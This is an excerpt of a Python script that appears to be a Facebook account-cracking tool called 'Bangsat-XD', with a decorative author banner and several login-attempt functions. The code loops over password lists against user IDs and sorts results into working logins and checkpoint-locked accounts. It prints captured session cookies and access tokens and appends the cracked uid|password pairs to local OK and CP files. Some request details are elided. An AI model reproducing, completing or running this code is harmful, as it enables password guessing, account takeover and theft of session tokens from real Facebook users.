...
def logo():
	os.system("clear")
	print("""\x1b[0;32m╔════════════════════════════════════════════╗
\x1b[0;33m║WELCOME TO Bangsat-XD TOOLS DEVELOPED BY ☆ RAKA ☆ ™︻®╤───────═◍➤.  ║
\x1b[0;33m║       #TOOL AUTHOR [☆ RAKA ☆ ™︻®╤───────═◍➤] SIMPLE BOY BD. ║
\x1b[0;33m╚════════════════════════════════════════════╝
\x1b[0;33m ---------------------------------------------
\x1b[0;33m╔════════════════════════════════════════════╗
\x1b[0;33m║#WEBSITE     : FOLLOW MY FACEBOOK TO FIND IT.║
\x1b[0;33m║#FACEBOOK : NAME [GARANGAN.KECHE ].       ║
\x1b[0;33m║#GITHUB : https://github.com/Bangsat-XD.  ║
\x1b[0;33m║#INSTAGRAN : raka_andrian27.                   ║
\x1b[0;33m╚════════════════════════════════════════════╝""")
def login():
	os.system("clear")
	try:
...
def cek_ttl_cp(uid, pw):
	try:
		...
		with requests.Session() as ses:
			...
			print("\r\033[0;95m[RAKA-CP] %s|%s|%s %s %s\033[0;91m"%(uid, pw, day, month, year))
	...
	try:
		for pw in pwx:
			...
			if "session_key" in send.text and "EAAA" in send.text:
				print("\r\033[0;94m[RAKA-OK] %s|%s|%s\033[0;97m"%(uid, pw, send.json()["access_token"]))
				ok.append("%s|%s"%(uid, pw))
				open("OK/%s.txt"%(tBilall),"a").write(" + %s|%s\n"%(uid, pw))
				break
				continue
			elif "www.facebook.com" in send.json()["error_msg"]:
				print("\r\033[0;95m[RAKA-CP] %s|%s\033[0;92m        "%(uid, pw))
				cp.append("%s|%s"%(uid, pw))
	...
	try:
		for pw in pwx:
			...
			if "c_user" in ses.cookies.get_dict().keys():
				...
				print("\r\033[0;94m[RAKA-OK] %s|%s|%s\033[0;95m"%(uid, pw, kuki))
				ok.append("%s|%s"%(uid, pw))
				open("OK/%s.txt"%(tBilall),"a").write(" + %s|%s\n"%(uid, pw))
				break
				continue
			elif "checkpoint" in ses.cookies.get_dict().keys():
				print("\r\033[0;95m[RAKA-CP] %s|%s\033[0;96m        "%(uid, pw))
				cp.append("%s|%s"%(uid, pw))
				open("CP/%s.txt"%(tBilall),"a").write(" + %s|%s\n"%(uid, pw))
				break
				continue
...
def mobile(user):
	...
	try:
		for pw in pwx:
			...
			if "c_user" in ses.cookies.get_dict().keys():
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				print("\r\033[0;94m[RAKA-OK] %s|%s|%s\033[0;97m"%(uid, pw, kuki))
				ok.append("%s|%s"%(uid, pw))
				open("OK/%s.txt"%(tBilall),"a").write(" + %s|%s\n"%(uid, pw))
				break
				continue
			elif "checkpoint" in ses.cookies.get_dict().keys():
				print("\r\033[0;95m[RAKA-CP] %s|%s\033[0;91m        "%(uid, pw))
				cp.append("%s|%s"%(uid, pw))
				open("CP/%s.txt"%(tBilall),"a").write(" + %s|%s\n"%(uid, pw))
				break
				continue
